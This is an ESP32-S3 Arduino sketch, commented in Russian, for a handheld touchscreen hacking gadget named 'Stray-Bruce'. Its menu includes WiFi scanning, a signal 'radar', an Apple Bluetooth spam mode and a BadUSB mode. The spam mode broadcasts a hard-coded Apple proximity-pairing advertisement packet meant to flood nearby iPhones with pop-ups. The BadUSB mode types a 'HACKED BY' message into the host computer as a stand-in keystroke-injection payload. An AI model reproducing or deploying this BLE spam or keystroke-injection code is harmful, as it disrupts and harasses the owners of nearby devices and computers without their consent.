#include "Adafruit_GFX.h"
#include "Adafruit_ILI9341.h"
#include <Wire.h>
#include <Adafruit_FT6206.h>
#include <WiFi.h>
#include <NimBLEDevice.h> 
#include "USB.h"
#include "USBHIDKeyboard.h"

// --- ПИНЫ (Твоя база) ---
#define TFT_CS 42
#define TFT_DC 40
#define TFT_RST 41
#define STRAY_YELLOW 0xFFE0 
#define STRAY_ORANGE 0xFD20

Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, 39, 38, TFT_RST);
Adafruit_FT6206 ts = Adafruit_FT6206();
USBHIDKeyboard Keyboard;

// Глобальные переменные
int current = 0;
int state = 0; 
const char* menu[] = {"WIFI SCAN", "RADAR", "BT SPAM", "BAD USB", "SYSTEM"};

// Переменные Радара
float radarAngle = 0;
// Переменные BT Spam
bool isSpamming = false;
NimBLEAdvertising *pAdvertising;
uint8_t apple_packet[] = { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12 };

// Переменные Графика
int graphX = 11;
int lastY = 180;
unsigned long lastGraphUpdate = 0;

void setup() {
  tft.begin();
  tft.setRotation(1); 
  Wire.begin(2, 1); 
  ts.begin(40);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  USB.begin();
  drawMain();
}

// --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
void drawExitButton() {
  // Крестик теперь СЛЕВА (как на твоем фото) и область тача под него настроена
  tft.fillRect(0, 0, 40, 40, ILI9341_RED); 
  tft.setTextColor(ILI9341_WHITE); tft.setTextSize(2);
  tft.setCursor(12, 12); tft.print("X");
}

// --- ПРИЛОЖЕНИЯ ---

void runScanner() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  tft.setCursor(10, 50); tft.setTextColor(STRAY_YELLOW); tft.setTextSize(1);
  tft.println("SCANNING WIFI...");
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n && i < 8; i++) {
    tft.setCursor(10, 70 + (i*15));
    tft.setTextColor(STRAY_YELLOW); tft.print(i+1); tft.print(": ");
    tft.setTextColor(ILI9341_WHITE); tft.println(WiFi.SSID(i));
  }
}

void runRadar() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  while(state == 1) {
    int n = WiFi.scanNetworks();
    for(int a=0; a<10; a++) {
      tft.drawCircle(160, 120, 100, STRAY_YELLOW);
      tft.drawCircle(160, 120, 60, STRAY_YELLOW);
      
      float oldAngle = radarAngle - 0.2;
      tft.drawLine(160, 120, 160+cos(oldAngle)*100, 120+sin(oldAngle)*100, ILI9341_BLACK);
      tft.drawLine(160, 120, 160+cos(radarAngle)*100, 120+sin(radarAngle)*100, STRAY_YELLOW);
      radarAngle += 0.2;

      for (int i = 0; i < n && i < 10; i++) {
        int d = map(WiFi.RSSI(i), -100, -30, 100, 10);
        float pAng = i * (6.28 / n);
        int px = 160 + cos(pAng) * d;
        int py = 120 + sin(pAng) * d;
        uint16_t dotColor = (WiFi.SSID(i).indexOf("Wokwi") >= 0) ? ILI9341_RED : STRAY_YELLOW;
        tft.fillCircle(px, py, 4, dotColor);
      }

      if (ts.touched()) {
        TS_Point p = ts.getPoint();
        int tx = map(p.y, 0, 320, 0, 320);
        int ty = map(p.x, 0, 240, 240, 0); // Калибровка Y
        if (tx < 50 && ty < 50) { drawMain(); return; } // Клик по крестику
      }
      delay(30);
    }
  }
}

void startSpam() {
  NimBLEDevice::init("Stray-Bruce");
  pAdvertising = NimBLEDevice::getAdvertising();
  NimBLEAdvertisementData advertData;
  advertData.addData(apple_packet, sizeof(apple_packet));
  pAdvertising->setAdvertisementData(advertData);
  pAdvertising->start();
  isSpamming = true;
}

void stopSpam() {
  if (pAdvertising) pAdvertising->stop();
  NimBLEDevice::deinit(true);
  isSpamming = false;
}

void runBTSpam() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  tft.setTextColor(STRAY_ORANGE); tft.setTextSize(2);
  tft.setCursor(50, 10); tft.println("APPLE BT SPAM");
  tft.drawFastHLine(0, 45, 320, STRAY_ORANGE);
  
  tft.setTextSize(1); tft.setCursor(10, 60); tft.print("STATUS: ");
  if (isSpamming) { tft.setTextColor(0x07E0); tft.println("ATTACKING..."); }
  else { tft.setTextColor(ILI9341_RED); tft.println("READY"); }
  
  tft.drawRect(80, 100, 160, 80, STRAY_ORANGE);
  tft.setCursor(120, 135); tft.setTextSize(2);
  tft.print(isSpamming ? "STOP" : "START");
}

void runBadUSB() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  tft.setTextColor(STRAY_ORANGE); tft.setTextSize(2);
  tft.setCursor(50, 10); tft.println("BAD USB MODE");
  tft.drawRect(60, 100, 200, 60, STRAY_YELLOW);
  tft.setCursor(95, 125); tft.print("RUN PAYLOAD");
}

void runSystemInfo() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  tft.setTextColor(STRAY_YELLOW); tft.setTextSize(2);
  tft.setCursor(50, 10); tft.println("SYSTEM STATUS:");
  tft.drawFastHLine(0, 45, 320, STRAY_YELLOW);
  tft.setTextSize(1);
  tft.setCursor(10, 55); tft.print("USER: STRAY_2025");
  tft.setCursor(10, 75); tft.print("CHIP: S3 N16R8 | ONLINE");
  tft.drawRect(10, 130, 300, 80, STRAY_YELLOW);
  graphX = 11;
  tft.setTextColor(0x07E0);
  tft.setCursor(10, 220); tft.println("STRAY-BRUCE OS v10.7 ONLINE (Fix Touch)");
}

void updateGraph() {
  if (millis() - lastGraphUpdate > 50) {
    if (graphX > 305) { tft.fillRect(11, 131, 298, 78, ILI9341_BLACK); graphX = 11; }
    int val = random(140, 205);
    tft.drawLine(graphX, lastY, graphX + 2, val, 0x07E0);
    lastY = val; graphX += 2; lastGraphUpdate = millis();
  }
}

// --- ГЛАВНОЕ МЕНЮ ---

void drawMain() {
  state = 0; if (isSpamming) stopSpam();
  tft.fillScreen(ILI9341_BLACK);
  tft.fillRect(0, 0, 320, 45, STRAY_YELLOW);
  tft.setTextColor(ILI9341_BLACK); tft.setTextSize(2);
  tft.setCursor(65, 15); tft.print("STRAY-BRUCE v10.7");
  tft.drawRect(60, 85, 200, 80, STRAY_YELLOW); 
  drawMainText();
  tft.fillTriangle(15, 125, 45, 95, 45, 155, STRAY_YELLOW);   
  tft.fillTriangle(305, 125, 275, 95, 275, 155, STRAY_YELLOW); 
}

void drawMainText() {
  tft.fillRect(62, 87, 196, 76, ILI9341_BLACK);
  tft.setTextColor(STRAY_YELLOW); tft.setTextSize(2);
  int textLen = strlen(menu[current]);
  tft.setCursor(160 - (textLen * 6), 115); tft.print(menu[current]);
}

void loop() {
  if (ts.touched()) {
    TS_Point p = ts.getPoint();
    int tx = map(p.y, 0, 320, 0, 320);
    int ty = map(p.x, 0, 240, 240, 0); // Исправленная инверсия Y

    if (state == 0) { // Навигация в меню
      if (tx < 60) { current = (current > 0) ? current - 1 : 4; drawMainText(); delay(250); }
      else if (tx > 260) { current = (current + 1) % 5; drawMainText(); delay(250); }
      else if (tx > 60 && tx < 260 && ty > 80 && ty < 160) { 
        if (current == 0) runScanner(); 
        else if (current == 1) runRadar();
        else if (current == 2) runBTSpam();
        else if (current == 3) runBadUSB();
        else if (current == 4) runSystemInfo();
        delay(300); 
      }
    } 
    else if (state == 1) { // Внутри приложений
      if (tx < 50 && ty < 50) { drawMain(); delay(300); } // Выход по крестику
      if (current == 2 && tx > 80 && tx < 240 && ty > 100 && ty < 180) { 
        if (!isSpamming) startSpam(); else stopSpam(); runBTSpam(); delay(400); 
      }
      if (current == 3 && tx > 60 && tx < 260 && ty > 100 && ty < 160) {
        Keyboard.println("HACKED BY STRAY-BRUCE"); delay(400);
      }
    }
  }
  if (state == 1 && current == 4) updateGraph();
}
